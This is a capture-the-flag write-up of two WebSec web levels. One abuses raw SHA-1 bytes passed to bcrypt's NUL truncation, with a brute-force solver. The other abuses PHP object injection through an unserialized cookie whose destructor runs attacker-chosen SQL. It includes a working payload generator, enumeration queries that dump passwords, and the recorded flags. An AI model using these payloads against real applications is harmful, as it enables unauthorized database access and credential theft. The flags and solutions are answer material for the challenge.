---
title: "WebSec — Levels 3 and 4"
ctf: "WebSec"
date: 2026-04-04
category: "Web Security · PHP, Hashing, Deserialization"
tags: ["websec", "php", "sha1", "bcrypt", "deserialization", "php-object-injection", "sqlite"]
excerpt: "Two WebSec solves: a raw-hash and bcrypt truncation bug, then PHP object injection that turns a cookie into SQL execution."
---

These are two levels from the same WebSec series. They fit together nicely: the first is a hash-format mistake, and the second turns a cookie into SQL execution.

## Level 3 — ChaChaCha — raw SHA-1 bytes inside bcrypt

**Category:** Web  
**Result:** recorded successful input and flag  
**Flag:** `WEBSEC{Please_Do_not_combine_rAw_hash_functions_mi}`

#### The code looks like a collision challenge

The relevant application logic is:

```php
$h2 = password_hash(sha1($_POST['c'], fa1se), PASSWORD_BCRYPT);

if (password_verify(sha1($flag, fa1se), $h2) === true) {
    echo $flag;
} else {
    echo sha1($flag, false);
}
```

The code looks like it wants a SHA-1 collision, but the real bug is simpler. The misspelled `fa1se` changes the hash output mode, and bcrypt treats an early NUL byte as the end of the password it checks.

#### Step 1: identify the raw digest mode

The second parameter to `sha1()` controls the return format:

```text
false → 40-character hexadecimal text
true  → 20 raw digest bytes
```

In the challenge environment, the undefined `fa1se` value is treated as truthy, so both values passed to bcrypt are raw binary SHA-1 digests rather than hex strings.

That spelling is easy to read past because it looks like the programmer intended `false`. In the challenge's PHP compatibility mode, the unresolved name is treated as a truthy value. The useful debugging move was to inspect the length and bytes reaching `password_hash()`, not to trust the visual spelling in the source.

The failure branch leaks the printable SHA-1 of the flag:

```text
7c00249d409a91ab84e3f421c193520d9fb3674b
```

As bytes, that begins:

```text
7c 00 24 9d 40 9a 91 ab ...
```

The second byte is `00`. Bcrypt's handling of NUL-terminated input means the comparison can effectively stop at that point. Therefore we do not need a full collision. We need a value whose raw SHA-1 starts with the same two bytes `7c 00`.

This changes the search size completely. Matching two raw bytes is a roughly `2^16` event, so a small local brute force is realistic. Matching the 40-character hexadecimal representation would be a different problem, and finding a cryptographic SHA-1 collision would be wildly out of scope. The bug is the representation boundary between SHA-1 and bcrypt, not a break of SHA-1 itself.

#### Solver / Reproduction

The original repository includes the brute-force idea inline. I also kept it as [`level3_prefix.py`](/solvers/websec/level3_prefix.py):

```sh
python3 level3_prefix.py
```

The core search is:

```python
import hashlib
import itertools
import string

alphabet = string.ascii_letters + string.digits
for length in range(1, 8):
    for chars in itertools.product(alphabet, repeat=length):
        candidate = "".join(chars)
        if hashlib.sha1(candidate.encode()).hexdigest().startswith("7c00"):
            print(candidate)
            raise SystemExit
```

The recorded result is:

```text
CWM
```

I verified the candidate in the same representation the application uses: `hashlib.sha1(b"CWM").digest()`, not the printable `hexdigest()`. Keeping that distinction in the solver prevents a future edit from silently turning the prefix search into a different check.

Submitting `CWM` makes `sha1("CWM", true)` begin with the same `7c 00` prefix as the flag digest, and the application prints the flag. This is a raw-hash plus bcrypt truncation bug, not a cryptographically meaningful SHA-1 collision.

#### What to remember

Hash output format is part of the security boundary. A hex digest and a raw digest have different lengths, different bytes, and different behavior when passed to another API. Hashing twice does not automatically make a protocol safer; it can create a new parser or truncation boundary between the two functions.

## Level 4 — Serialization Is a Pain — a cookie becomes SQL

**Category:** Web  
**Result:** recorded database enumeration and flag extraction  
**Flag:** `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`

#### The cookie is the input that matters

The application creates a normal cookie by serializing an IP array:

```php
$cookie = base64_encode(serialize(array(
    'ip' => $_SERVER['REMOTE_ADDR']
)));
```

On the next request it trusts the cookie enough to do this:

```php
$sess_data = unserialize(base64_decode($_COOKIE['leet_hax0r']));
```

That is the root cause. The cookie is controlled by the client, and PHP `unserialize()` can rebuild objects as well as arrays. The application has already loaded a class named `SQL`, so a serialized `SQL` object is a valid object graph at the moment the cookie is decoded.

#### Why the IP check does not save it

The check is guarded by `is_array()`:

```php
if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
    die('CANT HACK US!!!');
}
```

The payload is an object, not an array. `is_array($sess_data)` is therefore false and the comparison never runs. The bypass is a type confusion in the session format, not IP spoofing.

The serialized value also needs to match PHP's property layout. Public properties are encoded with their plain names, while protected and private properties carry NUL-delimited class-scope names. Using a public `SQL` object keeps the payload short and matches the class definition exposed by the application; changing the visibility in the generator would change both the serialized bytes and the object the destructor receives.

#### The destructor is the execution sink

The loaded class contains:

```php
class SQL {
    public $query = '';
    public $conn;

    public function connect() {
        $this->conn = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
    }

    public function execute() {
        return $this->conn->query($this->query);
    }

    public function __destruct() {
        if (!isset($this->conn)) {
            $this->connect();
        }
        $ret = $this->execute();
        while (false !== ($row = $ret->fetchArray(SQLITE3_ASSOC))) {
            echo $row['username'];
        }
    }
}
```

The injected object does not overwrite the application's original `$sql`. It creates a second object in `$sess_data`. When that object is destroyed at the end of the request, its `__destruct()` method runs automatically. By setting `query` to attacker-controlled SQL and `conn` to `null`, the destructor reconnects and executes the query.

This is more precise than calling it ordinary SQL injection. The database query is controlled because object injection gives us control of a property that a magic method later executes:

```text
untrusted cookie
→ base64_decode
→ unserialize
→ SQL object
→ __destruct()
→ attacker-controlled query
→ SQLite output
```

#### The output shape matters

The destructor prints `$row['username']`, so every enumeration query needs to return a column named `username`. SQLite aliases make the output fit the existing sink:

```sql
SELECT name AS username FROM sqlite_master WHERE type='table';
SELECT sql AS username FROM sqlite_master WHERE name='users';
SELECT username || ':' || password AS username FROM users;
```

The recorded responses reveal the table, its schema, and finally the flag-bearing password value.

The three queries are deliberately staged. The first tells us which tables exist, the second tells us which column is printed by the sink, and the third asks for the value while aliasing it as `username`. Asking for the flag directly without respecting that output shape would execute successfully but print nothing useful.

#### Solver / Reproduction

The repository contains [`payload_level4.php`](/solvers/websec/payload_level4.php), which lets PHP calculate the serialized property lengths instead of hand-counting them:

```sh
php payload_level4.php
```

The generator is:

```php
<?php
class SQL {
    public $query = '';
    public $conn;
}

function make_payload($sql) {
    $obj = new SQL();
    $obj->query = $sql;
    $obj->conn = null;
    return base64_encode(serialize($obj));
}

echo make_payload("SELECT password AS username FROM users"), "\n";
?>
```

For the full chain, generate one cookie per query. The source notes use this order:

```sql
SELECT name AS username FROM sqlite_master WHERE type='table'
SELECT sql AS username FROM sqlite_master WHERE name='users'
SELECT username || ':' || password AS username FROM users
```

The final recorded output is:

```text
WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
```

#### Common payload mistakes

- The cookie must be Base64 of the serialized object, not the raw serialized object.
- The query needs the `username` alias because that is the field the destructor prints.
- `conn` should be `null` so `isset($this->conn)` is false and the object reconnects.
- The injected object is separate from the application's legitimate `$sql` object.

## Source

Expanded from [`dat-nix/writeup-ctf-2026`](https://github.com/dat-nix/writeup-ctf-2026/tree/main/websec). The original code, payload generator, flags, and observed outputs are preserved; the article adds the trust-boundary and destructor reasoning around them.
